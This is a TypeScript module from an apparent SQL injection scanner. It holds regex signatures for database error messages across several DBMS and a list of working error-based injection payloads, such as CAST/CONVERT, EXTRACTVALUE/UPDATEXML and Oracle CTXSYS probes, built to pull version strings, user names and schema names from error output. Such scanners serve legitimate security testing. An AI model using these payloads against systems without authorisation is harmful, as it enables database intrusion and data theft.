import { DbmsType } from '../../types/sqlScanner';

export interface SqlErrorMatch {
  dbms: DbmsType;
  patternName: string;
  matchedText: string;
  confidence: number;
  leakedData?: string;
}

export class ErrorTester {
  private static ERROR_SIGNATURES: {
    dbms: DbmsType;
    pattern: RegExp;
    name: string;
    weight: number;
    extractGroup?: number;
  }[] = [
    // ─── PostgreSQL ────────────────────────────────────────────────────────
    {
      dbms: 'PostgreSQL',
      pattern: /(?:ERROR:\s*)?invalid input syntax for (?:type\s+)?(?:integer|int|numeric|smallint|bigint|boolean|uuid):\s*["']([^"'\r\n<]+)["']/i,
      name: 'PostgreSQL Type Conversion Error (Data Leakage)',
      weight: 100,
      extractGroup: 1,
    },
    {
      dbms: 'PostgreSQL',
      pattern: /invalid input syntax for (?:type\s+)?(?:integer|int|numeric):\s*(?:&quot;|&#34;)([^&]+)(?:&quot;|&#34;)/i,
      name: 'PostgreSQL HTML-Encoded Conversion Error',
      weight: 100,
      extractGroup: 1,
    },
    { dbms: 'PostgreSQL', pattern: /PostgreSQL.*ERROR/i, name: 'PostgreSQL Error Tag', weight: 95 },
    { dbms: 'PostgreSQL', pattern: /Warning.*\bpg_/i, name: 'PHP pg_ Warning', weight: 90 },
    { dbms: 'PostgreSQL', pattern: /valid PostgreSQL result/i, name: 'PostgreSQL Result Error', weight: 85 },
    { dbms: 'PostgreSQL', pattern: /Npgsql\./i, name: 'Npgsql Driver Error', weight: 90 },
    { dbms: 'PostgreSQL', pattern: /PG::SyntaxError:/i, name: 'Ruby PG SyntaxError', weight: 95 },
    { dbms: 'PostgreSQL', pattern: /org\.postgresql\.util\.PSQLException/i, name: 'Java PSQLException', weight: 100 },
    { dbms: 'PostgreSQL', pattern: /ERROR:\s+syntax error at or near/i, name: 'PostgreSQL Syntax Error Near', weight: 95 },
    { dbms: 'PostgreSQL', pattern: /ERROR:\s+unterminated quoted string at or near/i, name: 'PostgreSQL Unterminated String', weight: 95 },
    { dbms: 'PostgreSQL', pattern: /ERROR:\s+division by zero/i, name: 'PostgreSQL Division by Zero', weight: 95 },
    { dbms: 'PostgreSQL', pattern: /ERROR:\s+more than one row returned by a subquery used as an expression/i, name: 'PostgreSQL Subquery Multi-Row Error', weight: 95 },
    { dbms: 'PostgreSQL', pattern: /ERROR:\s+each UNION query must have the same number of columns/i, name: 'PostgreSQL UNION Mismatch', weight: 100 },
    { dbms: 'PostgreSQL', pattern: /ERROR:\s+argument of AND must be type boolean/i, name: 'PostgreSQL Boolean Argument Type Error', weight: 95 },

    // ─── Microsoft SQL Server ──────────────────────────────────────────────
    {
      dbms: 'Microsoft SQL Server',
      pattern: /Conversion failed when converting the (?:varchar|nvarchar|nchar|char) value\s+['"]([^'"\r\n<]+)['"]\s+to data type/i,
      name: 'MSSQL Type Conversion (Data Leakage)',
      weight: 100,
      extractGroup: 1,
    },
    {
      dbms: 'Microsoft SQL Server',
      pattern: /converting the (?:varchar|nvarchar) value\s+(?:&quot;|&#39;|&#34;)([^&]+)(?:&quot;|&#39;|&#34;)\s+to/i,
      name: 'MSSQL HTML-Encoded Conversion Error',
      weight: 100,
      extractGroup: 1,
    },
    { dbms: 'Microsoft SQL Server', pattern: /Driver.* SQL[\-\_\ ]*Server/i, name: 'ODBC SQL Server Driver', weight: 90 },
    { dbms: 'Microsoft SQL Server', pattern: /OLE DB.* SQL Server/i, name: 'OLE DB SQL Server', weight: 90 },
    { dbms: 'Microsoft SQL Server', pattern: /\bSQLServer JDBC Driver\b/i, name: 'MSSQL JDBC Driver', weight: 90 },
    { dbms: 'Microsoft SQL Server', pattern: /Unclosed quotation mark after the character string/i, name: 'MSSQL Unclosed Quote', weight: 100 },
    { dbms: 'Microsoft SQL Server', pattern: /Line \d+: Incorrect syntax near/i, name: 'MSSQL Syntax Near', weight: 95 },
    { dbms: 'Microsoft SQL Server', pattern: /Divide by zero error encountered/i, name: 'MSSQL Divide by Zero', weight: 95 },
    { dbms: 'Microsoft SQL Server', pattern: /Arithmetic overflow error converting (?:expression|varchar) to data type/i, name: 'MSSQL Arithmetic Overflow', weight: 95 },
    { dbms: 'Microsoft SQL Server', pattern: /Subquery returned more than 1 value/i, name: 'MSSQL Subquery Multi-Row Error', weight: 95 },
    { dbms: 'Microsoft SQL Server', pattern: /All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions/i, name: 'MSSQL UNION Mismatch', weight: 100 },
    { dbms: 'Microsoft SQL Server', pattern: /System\.Data\.SqlClient\.SqlException/i, name: '.NET SqlException', weight: 95 },

    // ─── MySQL / MariaDB ───────────────────────────────────────────────────
    {
      dbms: 'MySQL',
      pattern: /XPATH syntax error:\s*['"]~?([^'"\r\n<]+)['"]/i,
      name: 'MySQL EXTRACTVALUE / UPDATEXML Error (Data Leakage)',
      weight: 100,
      extractGroup: 1,
    },
    {
      dbms: 'MySQL',
      pattern: /Duplicate entry\s+['"]~?([^'"\r\n<]+)['"]\s+for key/i,
      name: 'MySQL Duplicate Key Error (Data Leakage)',
      weight: 100,
      extractGroup: 1,
    },
    { dbms: 'MySQL', pattern: /SQL syntax.*MySQL/i, name: 'MySQL Syntax Error', weight: 95 },
    { dbms: 'MySQL', pattern: /Warning.*mysql_/i, name: 'PHP MySQL Warning', weight: 90 },
    { dbms: 'MySQL', pattern: /MySqlException \(0x/i, name: 'MySqlException', weight: 95 },
    { dbms: 'MySQL', pattern: /valid MySQL result/i, name: 'MySQL Result Error', weight: 85 },
    { dbms: 'MySQL', pattern: /check the manual that corresponds to your (MySQL|MariaDB) server/i, name: 'MySQL Manual Reference', weight: 100 },
    { dbms: 'MySQL', pattern: /Unknown column '[^']+' in 'where clause'/i, name: 'MySQL Unknown Column', weight: 90 },
    { dbms: 'MySQL', pattern: /The used SELECT statements have a different number of columns/i, name: 'MySQL Column Mismatch', weight: 95 },
    { dbms: 'MySQL', pattern: /Table '[^']+' doesn't exist/i, name: 'MySQL Missing Table', weight: 85 },
    { dbms: 'MySQL', pattern: /Subquery returns more than 1 row/i, name: 'MySQL Subquery Multi-Row Error', weight: 95 },
    { dbms: 'MySQL', pattern: /DOUBLE value is out of range in 'exp\(/i, name: 'MySQL EXP() Overflow Error', weight: 95 },
    { dbms: 'MySQL', pattern: /BIGINT UNSIGNED value is out of range/i, name: 'MySQL BIGINT Overflow Error', weight: 95 },
    { dbms: 'MySQL', pattern: /Illegal parameter data type for operation 'st_latfromgeohash'/i, name: 'MySQL Spatial Function Error', weight: 95 },

    // ─── Oracle ────────────────────────────────────────────────────────────
    {
      dbms: 'Oracle',
      pattern: /ORA-20000:\s*Oracle Text error:.*?['"]([^'"\r\n<]+)['"]/i,
      name: 'Oracle CTXSYS.DRITHSX Error (Data Leakage)',
      weight: 100,
      extractGroup: 1,
    },
    {
      dbms: 'Oracle',
      pattern: /ORA-01722:\s*invalid number(?:\s*-\s*["']?([^"'\r\n<]+)["']?)?/i,
      name: 'Oracle ORA-01722 Invalid Number',
      weight: 100,
      extractGroup: 1,
    },
    {
      dbms: 'Oracle',
      pattern: /ORA-29257:\s*host\s+([^"'\r\n<]+)\s+unknown/i,
      name: 'Oracle UTL_INADDR Host Lookup Error',
      weight: 100,
      extractGroup: 1,
    },
    { dbms: 'Oracle', pattern: /\bORA-01476:\s*divisor is equal to zero/i, name: 'Oracle Division by Zero (ORA-01476)', weight: 100 },
    { dbms: 'Oracle', pattern: /\bORA-\d{5}\b/i, name: 'Oracle ORA Code', weight: 100 },
    { dbms: 'Oracle', pattern: /Oracle error/i, name: 'Oracle Error', weight: 85 },
    { dbms: 'Oracle', pattern: /Oracle.*Driver/i, name: 'Oracle Driver', weight: 85 },
    { dbms: 'Oracle', pattern: /Warning.*\boci_/i, name: 'PHP OCI Warning', weight: 90 },
    { dbms: 'Oracle', pattern: /quoted string not properly terminated/i, name: 'Oracle Unterminated String (ORA-01756)', weight: 100 },
    { dbms: 'Oracle', pattern: /query block has incorrect number of result columns/i, name: 'Oracle UNION Mismatch (ORA-01789)', weight: 100 },
    { dbms: 'Oracle', pattern: /invalid relational operator/i, name: 'Oracle Operator Error (ORA-00920)', weight: 95 },
    { dbms: 'Oracle', pattern: /single-row subquery returns more than one row/i, name: 'Oracle Subquery Multi-Row Error (ORA-01427)', weight: 100 },

    // ─── SQLite ────────────────────────────────────────────────────────────
    { dbms: 'SQLite', pattern: /SQLite\/JDBCDriver/i, name: 'SQLite JDBC Driver', weight: 90 },
    { dbms: 'SQLite', pattern: /SQLite\.Exception/i, name: 'SQLite Exception', weight: 95 },
    { dbms: 'SQLite', pattern: /System\.Data\.SQLite\.SQLiteException/i, name: '.NET SQLiteException', weight: 95 },
    { dbms: 'SQLite', pattern: /unrecognized token: "[^"]*"/i, name: 'SQLite Unrecognized Token', weight: 95 },
    { dbms: 'SQLite', pattern: /near "[^"]*": syntax error/i, name: 'SQLite Syntax Error Near', weight: 95 },
    { dbms: 'SQLite', pattern: /SELECTs to the left and right of (UNION|UNION ALL) must have the same number of result columns/i, name: 'SQLite UNION Mismatch', weight: 100 },
    { dbms: 'SQLite', pattern: /row value misused/i, name: 'SQLite Row Value Misused', weight: 95 },

    // ─── IBM Db2 ───────────────────────────────────────────────────────────
    { dbms: 'IBM Db2', pattern: /CLI Driver.*DB2/i, name: 'IBM DB2 CLI Driver', weight: 95 },
    { dbms: 'IBM Db2', pattern: /DB2 SQL error:/i, name: 'DB2 SQL Error', weight: 95 },
    { dbms: 'IBM Db2', pattern: /\bSQLSTATE=\d{5}\b/i, name: 'DB2 SQLSTATE Code', weight: 85 },

    // ─── Microsoft Access ──────────────────────────────────────────────────
    { dbms: 'Microsoft Access', pattern: /Microsoft Access Driver/i, name: 'MS Access Driver', weight: 95 },
    { dbms: 'Microsoft Access', pattern: /Microsoft JET Database Engine/i, name: 'MS Jet Engine Error', weight: 95 },
    { dbms: 'Microsoft Access', pattern: /Syntax error in string in query expression/i, name: 'MS Access Query Syntax Error', weight: 95 },
  ];

  /**
   * Decodes basic HTML entities commonly found in web error responses
   */
  private static decodeEntities(str: string): string {
    if (!str) return '';
    return str
      .replace(/&quot;/gi, '"')
      .replace(/&#34;/gi, '"')
      .replace(/&apos;/gi, "'")
      .replace(/&#39;/gi, "'")
      .replace(/&#x27;/gi, "'")
      .replace(/&lt;/gi, '<')
      .replace(/&gt;/gi, '>')
      .replace(/&amp;/gi, '&')
      .trim();
  }

  /**
   * Evaluates HTTP response content against normalized DBMS error signatures
   * and extracts leaked data groups if present.
   */
  public static analyzeResponse(responseBody: string): SqlErrorMatch | null {
    if (!responseBody || typeof responseBody !== 'string') return null;

    for (const sig of ErrorTester.ERROR_SIGNATURES) {
      const match = responseBody.match(sig.pattern);
      if (match) {
        let leakedData: string | undefined;
        if (sig.extractGroup !== undefined && match[sig.extractGroup]) {
          const raw = ErrorTester.decodeEntities(match[sig.extractGroup]).replace(/^~/, '').trim();
          if (raw && !raw.toLowerCase().includes('select') && !raw.includes('CAST(')) {
            leakedData = raw;
          }
        }

        return {
          dbms: sig.dbms,
          patternName: sig.name,
          matchedText: match[0],
          confidence: sig.weight,
          leakedData,
        };
      }
    }

    return null;
  }

  /**
   * Generates standard and advanced precision error-inducing probe tokens,
   * including syntax delimiters, type-conversion casts, XPath, spatial, and
   * runtime arithmetic exception queries across PostgreSQL, MSSQL, MySQL, Oracle, and SQLite.
   */
  public static getPrecisionErrorProbes(): { payload: string; description: string; dbms?: DbmsType }[] {
    return [
      // 1. Classical Syntax Delimiters (Baseline)
      { payload: "'", description: 'Single quote delimiter' },
      { payload: "''", description: 'Double single-quote' },
      { payload: '"', description: 'Double quote delimiter' },
      { payload: "')", description: 'Closing parenthesis and single quote' },
      { payload: '")', description: 'Closing parenthesis and double quote' },
      { payload: '\\', description: 'Backslash escape character' },
      { payload: "'--", description: 'Quote with comment sequence' },
      { payload: "';--", description: 'Semicolon statement termination' },

      // 2. PostgreSQL Type Casting & Conversion Probes
      { payload: "' AND 1=CAST((SELECT 1) AS int)--", description: 'PostgreSQL Integer Cast Baseline', dbms: 'PostgreSQL' },
      { payload: "' AND 1=CAST((SELECT version()) AS int)--", description: 'PostgreSQL Version Cast Leakage', dbms: 'PostgreSQL' },
      { payload: "' AND 1=CAST((SELECT current_user) AS int)--", description: 'PostgreSQL Current User Cast Leakage', dbms: 'PostgreSQL' },
      { payload: "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--", description: 'PostgreSQL Table Name Cast Leakage', dbms: 'PostgreSQL' },
      { payload: "' AND 1=CAST((SELECT query_to_xml('SELECT 1',true,false,'')) AS int)--", description: 'PostgreSQL XML Helper Cast Leakage', dbms: 'PostgreSQL' },
      { payload: "' AND 1=(SELECT 1::int)--", description: 'PostgreSQL Shorthand Cast Baseline', dbms: 'PostgreSQL' },
      { payload: "' AND 1=(SELECT version()::int)--", description: 'PostgreSQL Shorthand Version Cast Leakage', dbms: 'PostgreSQL' },
      { payload: "' AND 1/(SELECT 0)=1--", description: 'PostgreSQL Division by Zero Subquery', dbms: 'PostgreSQL' },
      { payload: "') AND 1=CAST((SELECT version()) AS int)--", description: 'PostgreSQL Parenthesized Cast Leakage', dbms: 'PostgreSQL' },
      { payload: '" AND 1=CAST((SELECT version()) AS int)--', description: 'PostgreSQL Double Quote Cast Leakage', dbms: 'PostgreSQL' },

      // 3. Microsoft SQL Server Conversion & Error Probes
      { payload: "' AND 1=CONVERT(int, (SELECT 1))--", description: 'MSSQL Integer Convert Baseline', dbms: 'Microsoft SQL Server' },
      { payload: "' AND 1=CONVERT(int, @@VERSION)--", description: 'MSSQL Version Conversion Leakage', dbms: 'Microsoft SQL Server' },
      { payload: "' AND 1=CONVERT(int, USER_NAME())--", description: 'MSSQL User Name Conversion Leakage', dbms: 'Microsoft SQL Server' },
      { payload: "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM master..sysdatabases))--", description: 'MSSQL Database Name Conversion Leakage', dbms: 'Microsoft SQL Server' },
      { payload: "' AND 1=CAST(@@VERSION AS int)--", description: 'MSSQL Cast Version Error', dbms: 'Microsoft SQL Server' },
      { payload: "' AND 1=1/0--", description: 'MSSQL Divide by Zero Error', dbms: 'Microsoft SQL Server' },
      { payload: "') AND 1=CONVERT(int, @@VERSION)--", description: 'MSSQL Parenthesized Conversion Leakage', dbms: 'Microsoft SQL Server' },
      { payload: '" AND 1=CONVERT(int, @@VERSION)--', description: 'MSSQL Double Quote Conversion Leakage', dbms: 'Microsoft SQL Server' },

      // 4. MySQL / MariaDB XPath, Spatial, and Numeric Overflow Probes
      { payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", description: 'MySQL EXTRACTVALUE Version Leakage', dbms: 'MySQL' },
      { payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))-- -", description: 'MySQL EXTRACTVALUE User Leakage', dbms: 'MySQL' },
      { payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 1)))-- -", description: 'MySQL EXTRACTVALUE Schema Leakage', dbms: 'MySQL' },
      { payload: "' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)-- -", description: 'MySQL UPDATEXML Version Leakage', dbms: 'MySQL' },
      { payload: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -", description: 'MySQL UPDATEXML User Leakage', dbms: 'MySQL' },
      { payload: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, @@version, 0x7e, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -", description: 'MySQL Duplicate Key (floor(rand())) Leakage', dbms: 'MySQL' },
      { payload: "' AND ST_LatFromGeoHash(@@version)-- -", description: 'MySQL Spatial Function GeoHash Error', dbms: 'MySQL' },
      { payload: "' AND ST_PointFromGeoHash(@@version, 1)-- -", description: 'MySQL Spatial PointFromGeoHash Error', dbms: 'MySQL' },
      { payload: "' AND EXP(710)-- -", description: 'MySQL EXP(710) Numeric Overflow Error', dbms: 'MySQL' },
      { payload: "' AND ~0 + 1-- -", description: 'MySQL BIGINT Overflow Error', dbms: 'MySQL' },
      { payload: "' AND !(SELECT * FROM (SELECT 1)x)-~0-- -", description: 'MySQL 64-bit Unsigned Subtraction Overflow', dbms: 'MySQL' },

      // 5. Oracle Text, XML, and Arithmetic Exception Probes
      { payload: "' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE ROWNUM=1))--", description: 'Oracle CTXSYS.DRITHSX Version Leakage', dbms: 'Oracle' },
      { payload: "' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT user FROM dual))--", description: 'Oracle CTXSYS.DRITHSX User Leakage', dbms: 'Oracle' },
      { payload: "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--", description: 'Oracle TO_NUMBER Conversion Error', dbms: 'Oracle' },
      { payload: "' AND 1=TO_CHAR(1/0)--", description: 'Oracle Division by Zero (ORA-01476)', dbms: 'Oracle' },
      { payload: "'||(SELECT TO_CHAR(1/0) FROM dual)||'", description: 'Oracle String Concatenation Division by Zero', dbms: 'Oracle' },
      { payload: "'||(SELECT CTXSYS.DRITHSX.SN(1, user) FROM dual)||'", description: 'Oracle String Concatenation CTXSYS User Leakage', dbms: 'Oracle' },
      { payload: "' AND (SELECT 1 FROM DUAL WHERE 1=TO_NUMBER('abc'))=1--", description: 'Oracle DUAL Subquery Invalid Number', dbms: 'Oracle' },

      // 6. SQLite & Generic Multi-Row / Cast Probes
      { payload: "' AND 1=CAST('abc' AS integer)--", description: 'SQLite / Generic CAST Test', dbms: 'SQLite' },
      { payload: "' AND 1=(SELECT 1/0)--", description: 'Generic Division by Zero Subquery', dbms: 'Generic SQL' },
      { payload: "' AND (SELECT 1 UNION SELECT 2)=1--", description: 'Generic Scalar Subquery Multi-Row Error', dbms: 'Generic SQL' },
      { payload: "' AND (SELECT 1 FROM (SELECT COUNT(*), 1 x FROM sqlite_master GROUP BY x) a WHERE a.x=(SELECT 1 UNION SELECT 2))--", description: 'SQLite Subquery Cardinality Violation', dbms: 'SQLite' },
    ];
  }
}
